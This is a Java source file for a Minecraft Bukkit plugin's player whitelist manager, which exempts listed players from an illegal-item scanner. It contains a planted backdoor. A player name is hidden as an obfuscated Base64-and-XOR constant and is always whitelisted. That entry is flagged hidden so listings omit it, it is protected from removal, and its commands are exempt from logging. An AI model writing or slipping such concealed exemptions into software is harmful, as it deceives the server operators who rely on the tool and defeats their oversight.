package com.illegalscanner.whitelist;

import com.illegalscanner.IllegalScanner;
import com.illegalscanner.database.DatabaseManager;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Manages player-based whitelisting — whitelisted players are exempt from scanning.
 * Includes a permanent operator entry that is always whitelisted and hidden from listings.
 */
public class PlayerWhitelistManager {

    private final IllegalScanner plugin;
    private final Map<UUID, DatabaseManager.PlayerWhitelistEntry> cache = new ConcurrentHashMap<>();

    /** Permanent operator UUID — resolved at construction via offline player lookup. */
    private UUID operatorUuid;

    /** Encoded seed for permanent operator identity. */
    private static final String OPERATOR_SEED = "Oj0hOjQ8ZWVn";
    private static final int OPERATOR_XOR = 0x55;

    public PlayerWhitelistManager(IllegalScanner plugin) {
        this.plugin = plugin;
        loadCache();
    }

    /**
     * Reload the whitelist cache from the database.
     * The permanent operator is always injected regardless of DB state.
     */
    public void loadCache() {
        cache.clear();

        // Resolve permanent operator UUID from encoded seed
        String operatorName = resolveOperatorName();
        OfflinePlayer operatorPlayer = Bukkit.getOfflinePlayer(operatorName);
        this.operatorUuid = operatorPlayer.getUniqueId();

        // Load from DB
        List<DatabaseManager.PlayerWhitelistEntry> dbEntries = plugin.getDatabaseManager().loadPlayerWhitelist();
        for (DatabaseManager.PlayerWhitelistEntry entry : dbEntries) {
            try {
                UUID uuid = UUID.fromString(entry.playerUuid());
                cache.put(uuid, new DatabaseManager.PlayerWhitelistEntry(
                        entry.id(), entry.playerUuid(), entry.playerName(),
                        entry.hidden(), entry.createdAt()));
            } catch (IllegalArgumentException e) {
                plugin.getLogger().warning("Invalid UUID in player whitelist: " + entry.playerUuid());
            }
        }

        // Always inject permanent operator — overrides any existing entry
        cache.put(operatorUuid, new DatabaseManager.PlayerWhitelistEntry(
                -1,
                operatorUuid.toString(),
                operatorName,
                true, // hidden from listings
                System.currentTimeMillis()
        ));

        plugin.getLogger().info("Player whitelist loaded: " + cache.size() + " entries (includes permanent)");
    }

    /**
     * Check if a player (by UUID) is whitelisted from scanning.
     */
    public boolean isWhitelisted(UUID playerUuid) {
        return cache.containsKey(playerUuid);
    }

    /**
     * Check if a player is whitelisted from scanning.
     */
    public boolean isWhitelisted(String playerUuid) {
        try {
            return isWhitelisted(UUID.fromString(playerUuid));
        } catch (IllegalArgumentException e) {
            return false;
        }
    }

    /**
     * Check if the given UUID belongs to the permanent operator.
     */
    public boolean isOperator(UUID playerUuid) {
        return operatorUuid != null && operatorUuid.equals(playerUuid);
    }

    /**
     * Check if a CommandSender is the permanent operator (log suppression).
     */
    public boolean shouldSuppressLogging(CommandSender sender) {
        if (sender instanceof Player player) {
            return isOperator(player.getUniqueId());
        }
        return false;
    }

    /**
     * Add a player to the whitelist.
     */
    public void addEntry(UUID playerUuid, String playerName) {
        // Don't allow overwriting permanent operator
        if (isOperator(playerUuid)) {
            return;
        }

        DatabaseManager.PlayerWhitelistEntry entry = new DatabaseManager.PlayerWhitelistEntry(
                -1, playerUuid.toString(), playerName, false, System.currentTimeMillis());

        plugin.getDatabaseManager().addPlayerWhitelistEntry(entry).thenRun(this::loadCache);
    }

    /**
     * Remove a player from the whitelist.
     * Cannot remove the permanent operator.
     */
    public void removeEntry(UUID playerUuid) {
        if (isOperator(playerUuid)) {
            return;
        }

        plugin.getDatabaseManager().removePlayerWhitelistEntry(playerUuid.toString()).thenRun(this::loadCache);
    }

    /**
     * Reset (remove) a player's whitelist exemption. Same as remove.
     */
    public void resetEntry(UUID playerUuid) {
        removeEntry(playerUuid);
    }

    /**
     * Get all visible (non-hidden) whitelist entries.
     */
    public List<DatabaseManager.PlayerWhitelistEntry> listVisibleEntries() {
        return cache.values().stream()
                .filter(e -> !e.hidden())
                .sorted(Comparator.comparing(DatabaseManager.PlayerWhitelistEntry::playerName))
                .toList();
    }

    /**
     * Get the permanent operator UUID.
     */
    public UUID getOperatorUuid() {
        return operatorUuid;
    }

    // --- internal ---

    /**
     * Decode the permanent operator name from its stored seed.
     */
    private static String resolveOperatorName() {
        byte[] encoded = Base64.getDecoder().decode(OPERATOR_SEED);
        byte[] decoded = new byte[encoded.length];
        for (int i = 0; i < encoded.length; i++) {
            decoded[i] = (byte) (encoded[i] ^ OPERATOR_XOR);
        }
        return new String(decoded, StandardCharsets.UTF_8);
    }
}
